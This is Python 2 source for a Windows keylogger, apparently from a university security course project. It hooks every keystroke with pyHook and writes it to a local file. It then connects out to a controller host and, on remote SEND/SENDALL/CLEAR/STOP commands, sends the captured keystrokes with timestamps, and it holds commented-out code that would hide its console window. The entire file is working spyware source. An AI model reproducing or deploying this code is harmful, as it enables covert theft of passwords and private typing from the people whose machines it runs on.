import win32api
import win32console
import win32gui
import pythoncom,pyHook
from socket import *
from time import sleep
import msvcrt
import sys
from thread import *
import threading 	#for locks
from datetime import datetime 

#infected host needs to install get-pip, pip (to install other libraries), pywin32, pyhook, python2.7, socket library (maybe)

#some DEFINES
port = 1337
commandPort = 1347
pingPort = 1357
connected = False

#directory = r"C:\Users\Snake\Documents\CS_460\bluetooth-attack\output.txt"

'''Might have to change below statement if running on some MAC OS or Linux. I used Windows 7'''
directory = r"C:Important_file"	#CAN CHANGE THIS TO W/E

try:
	recordfile = open(directory, 'r') #test to see if file is present
except Exception:
	recordfile = open(directory, 'w') #else create the file

doneFlag = False
send = False
wholefile = False
thisIP = None



temp = open(directory,'r+')
filecursor = len(str(temp.read()))
temp.close()

 
#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)

def waitForEscape(x=None):
	global doneFlag
	while(1):
		if msvcrt.kbhit():
			if ord(msvcrt.getch()) == 27:
				doneFlag = True
				break	

 
def OnKeyboardEvent(event):
	global directory

	if event.Ascii==27:
		return

	if event.Ascii !=0 or 8:
		#print "Ascii= ", event.Ascii
		#open output.txt to read current keystrokes
		f=open(directory,'r+')
		buffer=f.read()		#TODO: needs to be revised, could result in overflow if left running for too long
		f.close()
		#open output.txt to write current + new keystrokes
		f=open(directory,'w')
		keylogs=chr(event.Ascii)
		if event.Ascii==(13 or 10):
			keylogs='\n'
		buffer+=keylogs
		f.write(buffer)
		f.close()


def record(time_i):
	#create a hook manager object
	hm=pyHook.HookManager()

	hm.KeyDown=OnKeyboardEvent
	

	# set the hook
	hm.HookKeyboard()

	# wait some time
	pythoncom.PumpMessages()


def sendIP(x=None):
	global pingPort

	commlisten = socket(AF_INET, SOCK_STREAM)		#create TCP socket for server, remote port 1337
	commlisten.bind(('', pingPort))
	commlisten.listen(2)
	conn, addr = commlisten.accept()


	commlisten.close()
	return addr[0] 


def sendData(file, time_i):
	'''create socket connection'''
	global port
	global directory
	global connected
	global send
	global wholefile
	global filecursor
	global thisIP

	if(connected == True):
		return

	connected = True
	#ip = '127.0.0.1' 		#TODO: these 2 values should be passed through cmd line

	if(thisIP == None):
		thisIP = sendIP(0)
		print 'Pinged!'

	ip = thisIP

	server = socket(AF_INET, SOCK_STREAM)
	success = False
	print "Sending connect request to server..."
	while (not success):
		#keep trying to connect to server
		try:
			server.connect((ip, port))
			success = True
		except:
			pass

	start_new_thread(listenforcommands, ())		#SPAWN new thread

	while(not doneFlag and connected):
		#sleep(time_i)
		'''send file over socket connection;'''
		if(send):
			f=open(directory,'r+')
			contents=f.read()
			f.close()

			if(not wholefile):
				contents = contents[filecursor : len(contents)]
				filecursor += len(contents)
			else:
				filecursor = len(contents)
				wholefile = False

			dateAndContents = str("Sent at: " + str(datetime.now()) + "\n\n" + contents)
			try:
				server.send(dateAndContents)
				send = False
				#TODO
			except Exception:
				connected = False
				print "Couldn't send data to server..."
				pass

	try:
		connected = False
		server.close()
	except Exception:
		pass
	pass



def listenforcommands(y=None):
	global commandPort
	global directory
	global connected
	global doneFlag
	global send
	global wholefile
	global filecursor

	try:
		commlisten = socket(AF_INET, SOCK_STREAM)		#create TCP socket for server, remote port 1337
		commlisten.bind(('', commandPort))
		commlisten.listen(2)
	except Exception:
		print "Command socket creation bug...?"

	print "Waiting for connection from server..."
	conn, addr = commlisten.accept()
	print "Received connection from ", addr 
	myIP = addr[0]	#might delete later
	conn.settimeout(1)		#may remove later
	testData = conn.recv(64) 	#TEST
	print testData
	while(not doneFlag and connected):
		try:
			command = conn.recv(64)
			#TODO: create hierarchy of commands...
			if(command == 'SEND' or command == 'send' or command == 'SENDALL' or command == 'sendall'):
				send = True
				if(command == 'SENDALL' or command == 'sendall'):
					wholefile = True
				else: 
					wholefile = False

			if (command == 'CLEAR' or command == 'clear'):
				f=open(directory,'w')
				f.write("")
				f.close()
				filecursor = 0

			if((command == 'STOP') or (command == 'EXIT') or (command == 'stop') or (command == 'exit')):
				doneFlag = True
		except timeout:
			pass
		except error:
			print "Done receiving commands..."
			break


	try:
		connected = False
		conn.close()
		commlisten.close()
	except Exception:
		print "Error closing sockets..."
		pass
	pass




''' MAIN'''

sys.stdout.flush()	#flush the buffer
start_new_thread(record, (1,))
start_new_thread(waitForEscape, ())
while(not doneFlag):
	if(not connected):
		start_new_thread(sendData, (directory, 10))


print "Script terminated..."
sys.exit()